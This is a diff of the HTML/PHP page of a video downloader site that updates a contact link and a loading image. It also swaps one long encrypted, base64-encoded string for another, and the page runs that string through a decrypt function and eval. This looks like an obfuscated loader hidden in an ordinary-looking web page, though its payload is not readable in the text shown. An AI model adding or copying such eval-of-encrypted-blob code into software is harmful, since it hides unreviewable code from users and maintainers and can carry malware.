@@ -216,7 +216,7 @@ body {
   <div class="navv-links">
     <a href="//instagram.com/theofficialvkr" target="_blank">Follow</a>
     <a href="https://tinyurl.com/g2mapkdl" target="_blank">Download App</a>
-    <a href="http://get2mate.ga/contacts.html" target="_blank">Contact us</a>
+    <a href="https://get2mateapi.herokuapp.com/contacts.html" target="_blank">Contact us</a>
     <a href="https://github.com/therealvk/vkrdownloader/" target="_blank">Code</a>
     <a href="mailto:contactvkr@yahoo.com" target="_blank">Mail us</a>
   </div>
@@ -235,7 +235,7 @@ body {
    </form>
    
    
-<center> <img width="150px" height="100px" src="http://get2mate.ga/images/timer.gif">
+<center> <img width="150px" height="100px" src="https://i.giphy.com/media/KOQOSymP4AWPc6976Y/giphy.webp">
 <br>
 Please wait Geting Search Result </center>
    
@@ -244,7 +244,7 @@ if(!function_exists('openssl_decrypt')){die('<h2>Function openssl_decrypt() not 
 if(!defined('_FILE_')){define("_FILE_",getcwd().DIRECTORY_SEPARATOR.basename($_SERVER['PHP_SELF']),false);}
 if(!defined('_DIR_')){define("_DIR_",getcwd(),false);}
 if(file_exists('../config.php')){include_once('../config.php');}else{die('<h2>File config.php not found !</h2>');}
-$e7091="1AFFruAxSXXik/khGNU4grU/IJX8G6BRsX+jUr893eQFGZYsM3hDKqkdOdIkGb3DGVTBvgIfcExnNXMuE+b8zCm9QjEq+NrvZlVTJStXjz8JEWozEJTQ5nlwQYw5Co7mn0Jk8aZs4Zfx9SGNWb65XTrVX6l2ER5uY0vs7z0Hm6q2abtwrP4i7Gpaa1hQLA735tWByoNqYm5k8JDZUAMK4Tl/nSECvW94nG73RGZjmq9L0TOwxnsmVKKKXmRF1sJ9FWsBAATodDL4Snng990CHp+X9/iMHPmb7kiFCJGM0dMBHsq41P28ndCZbWaecfsz2WS0pbnfbs4FfDV2MJU+loz8e0vXDpAVrpJ3Ua0LHuvz6TWZfU55EnmuCaW5D/ue19cOMjKosV0oo8nlge8duURYd2U311M5xbLqclsyzWax76Yev8q6r3cLGkExVOak9xO2sjVU1fRAFX1WumKtk16HsVyppO8cI8RP8JKSkTAGm5V4GEGbNOixlSxUe3pos7lirLeHn4zlan1BHbyYvQHJDfYwnfeP37QNNs4fJWuSUrPjTKoBIwcW/AfVqSbwonlB+h5TwRWlnhAib1nPrwqK+H6/878u7+yLaG62/SuOE+1AAquIxbKMSEfZqy17+ab9HEZvDxjk77eOnmXWIiKyYrlsuZCqi7uvrUYvrnc=";eval(e7061($e7091));
+$e7091="Y3B5NGdTRnpONGN6elUzWmoybFVqajRWRFUvSnNGTUpRYTF0UWFhdVhLQkpHa0dRYlF6QzRFQ1Bpc1loaSs0WDdLT3planprV25iWDByZGk1cjMySU9xYjZtaHA5a3RjeXBMVUxVdXJJUkJDY2VaQWpLc09QMzlaZE1Hd3Z2eGJ5MTZ2bVA2VXJScHU1TEQ0RWlPQ0pBRTh2QjEvQTJpWjgzNVFMZ0pCRkdGQTN0Y2JmOXZSeWREaFdPUlFDanpFNzV0SkwvbkNOMW5MdS9SM1czbjRkQjJ3b2pQVlRibTloelJPSDYxa1dzVHNoQy9ZK21HcVA3dU5FenNaSDhySFZUZHorMCtMRjU3ZDJUWVpDZnhlWHNsSUl3Q2Y4WEF0K3IwOUI4QnRrdHU1aHhDeWFMOTg3S1NIOWZrd1dLWEowZnc4OE4ya3NRYUtFR0h3QkpucDRRc0c5UU9lL2ZWTEhrdm5TL0pVRzJRY3ZzQXJsNU8weVlOTHE1TnNMRTVHRmowWHU0WkZVbVg2V1Y4V2xxM1hSUT09";eval(e7061($e7091));
 ?>
 
 
